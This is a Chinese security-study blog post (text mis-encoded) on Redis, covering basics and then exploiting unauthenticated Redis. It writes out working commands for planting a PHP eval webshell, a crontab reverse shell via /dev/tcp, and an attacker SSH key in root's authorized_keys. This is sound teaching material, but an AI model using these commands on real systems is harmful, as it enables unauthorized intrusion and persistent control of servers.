<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.getflag.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="å­¦ä¹ ä¸€ä¸‹ redis">
<meta property="og:type" content="article">
<meta property="og:title" content="rediså®‰å…¨å­¦ä¹ ">
<meta property="og:url" content="https://www.getflag.cn/2021/02/21/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="kawhi&#39;s Blog">
<meta property="og:description" content="å­¦ä¹ ä¸€ä¸‹ redis">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="f:/picture/rediså®‰å…¨å­¦ä¹ /image-20210215110136093.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210210201013150.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210210221530457.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214135824096.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218110907979.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214180724613.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214180806891.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218120854014.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218222540246.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/1.jpg">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/2.jpg">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219200608137.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219200655247.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219203616444.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218123601252.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218124917794.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218204928277.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218202617565.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219213118916.png">
<meta property="og:image" content="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210221162944340.png">
<meta property="article:published_time" content="2021-02-20T16:00:00.000Z">
<meta property="article:modified_time" content="2021-02-21T08:45:46.805Z">
<meta property="article:author" content="kawhi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="f:/picture/rediså®‰å…¨å­¦ä¹ /image-20210215110136093.png">

<link rel="canonical" href="https://www.getflag.cn/2021/02/21/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>rediså®‰å…¨å­¦ä¹  | kawhi's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">kawhi's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">ä»Šå¤©ä¹Ÿæ²¡ä»€ä¹ˆå¹²åŠ²</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fab fa-pagelines fa-fw"></i>å‹é“¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2021/02/21/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          rediså®‰å…¨å­¦ä¹ 
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-02-21 00:00:00 / ä¿®æ”¹æ—¶é—´ï¼š16:45:46" itemprop="dateCreated datePublished" datetime="2021-02-21T00:00:00+08:00">2021-02-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>9.3k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>8 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>å­¦ä¹ ä¸€ä¸‹ redis <a id="more"></a></p>
<h2 id="redisåŸºç¡€"><a href="#redisåŸºç¡€" class="headerlink" title="redisåŸºç¡€"></a>redisåŸºç¡€</h2><h3 id="ä¸€äº›åŸºç¡€æ“ä½œ"><a href="#ä¸€äº›åŸºç¡€æ“ä½œ" class="headerlink" title="ä¸€äº›åŸºç¡€æ“ä½œ"></a>ä¸€äº›åŸºç¡€æ“ä½œ</h3><p>redisæ˜¯ä¸€ä¸ª<code>key-value</code>å‹æ•°æ®åº“ï¼Œè¯¦ç»†åŸºç¡€çŸ¥è¯†å¯ä»¥å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.runoob.com/redis%EF%BC%8C%E8%BF%99%E9%87%8C%E6%8A%8A%E4%B8%80%E4%BA%9B%E8%A6%81%E7%82%B9%E7%BB%99%E7%BD%97%E5%88%97%E5%87%BA%E6%9D%A5">https://www.runoob.com/redisï¼Œè¿™é‡ŒæŠŠä¸€äº›è¦ç‚¹ç»™ç½—åˆ—å‡ºæ¥</a></p>
<ul>
<li>ubuntu å®‰è£… redis</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯åŠ¨ redis å’Œ client å®¢æˆ·ç«¯è¿æ¥</li>
</ul>
<p><code>redis-server</code>æŒ‡çš„æ˜¯ redis æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨<code>-port</code>æŒ‡å®šç«¯å£ï¼Œé»˜è®¤æ˜¯6379</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure>

<p><code>redis-cli</code>æŒ‡çš„æ˜¯ redis å‘½ä»¤è¡Œå®¢æˆ·ç«¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>

<ul>
<li>è®¾ç½®é”®å€¼å¯¹</li>
</ul>
<p>åˆ†åˆ«ç”¨<code>set</code>å’Œ<code>get</code>æ¥è®¾ç½®å’Œè·å–é”®å€¼å¯¹ï¼Œç”¨<code>keys *</code>è·å–<code>redis</code>ä¸­æ‰€æœ‰å¯ç”¨çš„<code>key</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set a 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get a</span><br><span class="line">&quot;1&quot;</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;a&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>é…ç½®æŸ¥çœ‹å’Œä¿®æ”¹</li>
</ul>
<p>redis çš„é…ç½®æ–‡ä»¶åä¸º <code>redis.conf</code>ï¼Œåœ¨ windows ä¸‹ä¸º <code>redis.windows.conf</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>config</code>å‘½ä»¤è·å–é…ç½®é¡¹ç­‰ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªç‰¹åˆ«æ³¨æ„ä¸€ä¸‹å°±æ˜¯ <code>dir</code> æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•ï¼Œ<code>dbfilename</code>æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º <code>dump.rdb</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6302&gt; config get *</span><br><span class="line">...</span><br><span class="line">127.0.0.1:6302&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;data&quot;</span><br><span class="line">127.0.0.1:6302&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;dump.rdb&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¿®æ”¹çš„è¯å¯ä»¥ä½¿ç”¨<code>set</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set loglevel &quot;notice&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config get loglevel</span><br><span class="line">1) &quot;loglevel&quot;</span><br><span class="line">2) &quot;notice&quot;</span><br></pre></td></tr></table></figure>

<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>Redisæ”¯æŒäº”ç§æ•°æ®ç±»å‹ï¼šstringï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œhashï¼ˆå“ˆå¸Œï¼‰ï¼Œlistï¼ˆåˆ—è¡¨ï¼‰ï¼Œsetï¼ˆé›†åˆï¼‰åŠzset(sorted setï¼šæœ‰åºé›†åˆ)</p>
<h3 id="redisåè®®"><a href="#redisåè®®" class="headerlink" title="redisåè®®"></a>redisåè®®</h3><p> redis ä½¿ç”¨çš„æ˜¯ resp åè®®ï¼Œé€šè¿‡ wireshark æŠ“æœ¬åœ°çš„åŒ…ï¼Œç„¶åè®¾ç½®è¿ä¸Š redis å†è®¾ç½®ä¸ªé”®å€¼å¯¹è§‚å¯Ÿä¸€ä¸‹ä»–çš„åè®®æ ¼å¼</p>
<p><img src="F:/picture/rediså®‰å…¨å­¦ä¹ /image-20210215110136093.png" alt="image-20210215110136093"></p>
<ul>
<li><code>*3</code>è¡¨ç¤º<code>set a 1</code>è¿™æ ·çš„ä»¥ç©ºæ ¼ä¸ºåˆ†å‰²çš„å…ƒç»„çš„å±æ€§ä¸ªæ•°</li>
<li><code>$3</code>è¡¨ç¤º<code>set</code>çš„é•¿åº¦ï¼ŒåŒç†å¾€ä¸‹çš„<code>$</code>éƒ½æ˜¯è¡¨ç¤ºé•¿åº¦</li>
</ul>
<p>æ‰€ä»¥å¯ä»¥å¾—å‡º redis åè®®çš„æ ¼å¼å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;å‚æ•°æ•°é‡&gt; CR LF</span><br><span class="line">$&lt;å‚æ•° 1 çš„å­—èŠ‚æ•°é‡&gt; CR LF</span><br><span class="line">&lt;å‚æ•° 1 çš„æ•°æ®&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;å‚æ•° N çš„å­—èŠ‚æ•°é‡&gt; CR LF</span><br><span class="line">&lt;å‚æ•° N çš„æ•°æ®&gt; CR LF</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œæ¯ä¸€è¡Œåé¢éƒ½æ˜¯ç”±CRLFç»ˆæ­¢çš„</p>
<h3 id="ä¸¤ç§æŒä¹…åŒ–è¿ä½œæ–¹æ¡ˆ"><a href="#ä¸¤ç§æŒä¹…åŒ–è¿ä½œæ–¹æ¡ˆ" class="headerlink" title="ä¸¤ç§æŒä¹…åŒ–è¿ä½œæ–¹æ¡ˆ"></a>ä¸¤ç§æŒä¹…åŒ–è¿ä½œæ–¹æ¡ˆ</h3><ul>
<li>RDB</li>
</ul>
<p>RDBæ˜¯å¯¹ redis ä¸­çš„æ•°æ®æ‰§è¡Œå‘¨æœŸæ€§çš„æŒä¹…åŒ–ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶ä¸­è®¾ç½®æ£€æŸ¥é—´éš”æ—¶é—´ä¸å¤‡ä»½è§¦å‘æ¡ä»¶æ¥å¯¹æ•°æ®è¿›è¡Œå‘¨æœŸæ€§çš„æŒä¹…åŒ–</p>
<ul>
<li>AOE</li>
</ul>
<p>AOFæœºåˆ¶å¯¹æ¯æ¡å†™å…¥å‘½ä»¤ä½œä¸ºæ—¥å¿—è®°å½•ï¼Œä»¥<code>append-only</code>çš„æ¨¡å¼å†™å…¥ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåœ¨ redis é‡å¯çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å›æ”¾AOFæ—¥å¿—ä¸­çš„å†™å…¥æŒ‡ä»¤æ¥é‡æ–°æ„å»ºæ•´ä¸ªæ•°æ®é›†</p>
<p>æ›´å¤šå¯ä»¥å‚è€ƒï¼š<a target="_blank" rel="noopener" href="http://redis.io/topics/persistence">http://redis.io/topics/persistence</a></p>
<h2 id="æœªæˆæƒè®¿é—®çš„åˆ©ç”¨"><a href="#æœªæˆæƒè®¿é—®çš„åˆ©ç”¨" class="headerlink" title="æœªæˆæƒè®¿é—®çš„åˆ©ç”¨"></a>æœªæˆæƒè®¿é—®çš„åˆ©ç”¨</h2><p>è¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯ redis ç›´æ¥ç»‘å®šåœ¨ 0.0.0.0:6379 ä¸Šï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹å¯†ç ä¼šä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡å¯¹è®¿é—®IPï¼Œç«¯å£è¿›è¡Œé™åˆ¶ï¼Œä»¥åŠè®¾ç½®å¯†ç ç­‰æªæ–½ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æœªæˆæƒè®¿é—® redisï¼Œä»è€Œè¿›è¡Œå†™ webshell ç­‰ä¸€ç³»åˆ—çš„æ“ä½œ</p>
<p>ç„¶å redis çš„ç‰ˆæœ¬æ˜¯åœ¨3.2ä»¥ä¸Šçš„è¯ï¼Œå¤ç°æ—¶éœ€è¦ç¼–è¾‘ä¿®æ”¹<code>/etc/redis/redis.conf</code>æ–‡ä»¶</p>
<ul>
<li>æ³¨é‡Š<code>bind 127.0.0.1</code></li>
<li><code>protected-mode</code>çš„å€¼è®¾ä¸º no</li>
</ul>
<p>ä¿®æ”¹ä¸ºä¹‹åå…³é—­ redis è¿›ç¨‹ï¼Œåœ¨ä½¿ç”¨<code>kill -9 pid</code>ä»ç„¶æ— æ³•åœæ­¢ redis çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;redis-server stop</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°å¯åŠ¨ redis</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<h3 id="å†™webshell"><a href="#å†™webshell" class="headerlink" title="å†™webshell"></a>å†™webshell</h3><p>åˆ©ç”¨ redis å¤‡ä»½æ–‡ä»¶å‘ web æ ¹ç›®å½•å†™ webshellï¼Œä½¿ç”¨æ¡ä»¶ï¼š</p>
<ul>
<li>å·²çŸ¥ç½‘ç«™æ ¹ç›®å½•</li>
<li>æœ‰æ–‡ä»¶è¯»å†™æƒé™</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli -h 192.168.0.103 -p 6379</span><br><span class="line">192.168.0.103:6379&gt; config set dir /var/www/html</span><br><span class="line">OK</span><br><span class="line">192.168.0.103:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.0.103:6379&gt; set shell &quot;&lt;?php eval($_GET[1]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.0.103:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸçš„å†™å…¥</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210210201013150.png" alt="image-20210210201013150"></p>
<p>è¿˜æœ‰å°±æ˜¯æ‰§è¡Œ<code>flushall</code>çš„è¯ï¼Œä¼šåˆ æ‰ redis å†…çš„å…¨éƒ¨é”®å€¼å¯¹</p>
<h3 id="crontabåå¼¹shell"><a href="#crontabåå¼¹shell" class="headerlink" title="crontabåå¼¹shell"></a>crontabåå¼¹shell</h3><p>å†™å®šæ—¶ä»»åŠ¡çš„ä¸¤ä¸ªæ–‡ä»¶ï¼š</p>
<ol>
<li><p><code>/var/spool/cron/</code> ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯æ¯ä¸ªç”¨æˆ·åŒ…æ‹¬ root çš„ crontab ä»»åŠ¡ï¼ŒUbuntu ç³»ç»Ÿåœ¨<code>/var/spool/cron/crontabs/&lt;username&gt;</code>ï¼ŒCentos ç³»ç»Ÿåˆ™åœ¨<code>/var/spool/cron/&lt;username&gt;</code></p>
</li>
<li><p><code>/etc/crontab</code> è¿™ä¸ªæ–‡ä»¶è´Ÿè´£è°ƒåº¦å„ç§ç®¡ç†å’Œç»´æŠ¤ä»»åŠ¡ï¼ŒCentos å’Œ Ubuntu ç³»ç»Ÿå‡å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦ root æƒé™</p>
</li>
</ol>
<ul>
<li>bash åå¼¹ shell</li>
</ul>
<p>è¿™ç§æ–¹æ³•åœ¨ ubuntu ä¸èƒ½å¤Ÿä½¿ç”¨ï¼ŒåŸå› æœ‰ä¸¤ä¸ª</p>
<ol>
<li>å¦‚æœå†™<code>/etc/crontab</code>æ–‡ä»¶ï¼Œä¼šå¤¹æ‚è„æ•°æ®å¯¼è‡´å‘½ä»¤è¯­æ³•æŠ¥é”™</li>
<li>å¦‚æœå†™<code>/var/spool/cron/crontabs/&lt;username&gt;</code>æ–‡ä»¶å› ä¸º redis å†™ 644 çš„æƒé™ï¼Œä½† ubuntu è¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶æƒé™å¿…é¡»æ˜¯ 600ï¼Œå¦åˆ™æŠ¥é”™<code>INSECURE MODE (mode 0600 expected) (crontabs/root)</code>ï¼Œå¹¶ä¸”å†™è¿™ä¸ªæ–‡ä»¶ä¹Ÿä¼šè¯­æ³•æŠ¥é”™</li>
</ol>
<p>ä½†æ˜¯åœ¨ centos ä¸Šåˆ™ä¸ä¼šï¼Œæ‰€ä»¥åœ¨ centos ä¸Šå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set shell &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="å†™ssh-key"><a href="#å†™ssh-key" class="headerlink" title="å†™ssh-key"></a>å†™ssh-key</h3><p>ä½¿ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼š</p>
<ul>
<li>redis æ˜¯ä»¥ root æƒé™å¯åŠ¨</li>
<li>å…è®¸å¯†é’¥ç™»é™†</li>
</ul>
<p>ä¸€èˆ¬ ssh å…¬é’¥å­˜æ”¾ç›®å½•ä¸º<code>/root/.ssh</code>ï¼Œç›®çš„å°±æ˜¯å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ <code>/root/.ssh</code>æ–‡ä»¶å¤¹çš„<code>authotrized_keys</code>æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”çš„ç§é’¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ï¼Œå¤ç°æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>åœ¨æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥ <code>ssh-keygen -t rsa</code></li>
</ol>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210210221530457.png" alt="image-20210210221530457"></p>
<ol start="2">
<li>å°†å…¬é’¥å†™å…¥ä¸´æ—¶æ–‡ä»¶ä¸­</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/rsa.txt   </span><br></pre></td></tr></table></figure>

<ol start="3">
<li>åŒæ ·çš„ä½¿ç”¨ config å†™å…¥æ–‡ä»¶</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/rsa.txt | redis-cli -h ip -p 6379 -x set rsa</span><br><span class="line">redis-cli -h ip -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>sshç™»å½•</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸Šæœ‰åˆ©ç”¨è„šæœ¬ï¼š<a target="_blank" rel="noopener" href="https://github.com/JoyChou93/hackredis">https://github.com/JoyChou93/hackredis</a></p>
